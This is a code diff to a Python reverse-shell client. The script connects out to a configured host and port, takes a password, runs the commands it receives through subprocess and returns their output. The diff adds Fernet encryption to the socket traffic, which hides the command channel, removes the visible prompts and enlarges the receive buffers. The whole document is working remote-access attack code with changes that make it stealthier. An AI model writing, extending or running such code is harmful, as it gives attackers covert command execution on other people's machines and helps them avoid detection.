@@ -3,24 +3,27 @@ import subprocess
 import socket
 import traceback
 
+from cryptography.fernet import Fernet
 from config import CONFIG
 
 
 def send(string):
-    global soc
-    soc.send(string.encode())
+    global soc, enc
+    message = string.encode()
+    soc.send(enc.encrypt(message))
 
 
 def recv(length):
-    global soc
-    return soc.recv(length).decode()
+    global soc, enc
+    decrypted = enc.decrypt(soc.recv(length))
+    message = decrypted.decode()
+    return message
 
 
 def login():
     global soc
     send("Login: ")
-    pwd = recv(2000)
-
+    pwd = recv(20000)
     if pwd.strip() == CONFIG.pwd:
         return True
     return False
@@ -28,9 +31,8 @@ def login():
 
 def shell():
     global soc
-    send("#> ")
     while True:
-        data = recv(2000)
+        data = recv(20000)
         output = ""
 
         if data.strip() == ":quit":
@@ -46,12 +48,15 @@ def shell():
             output = command.stdout.read().decode() + " " + command.stderr.read().decode()
 
         send(output)
-        send("#> ")
 
 
 if __name__ == "__main__":
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.connect((CONFIG.host, CONFIG.port))
+    key_file = open(CONFIG.key_file, 'rb')
+    key = key_file.read()
+    key_file.close()
+    enc = Fernet(key)
     while not login():
         continue
     shell()
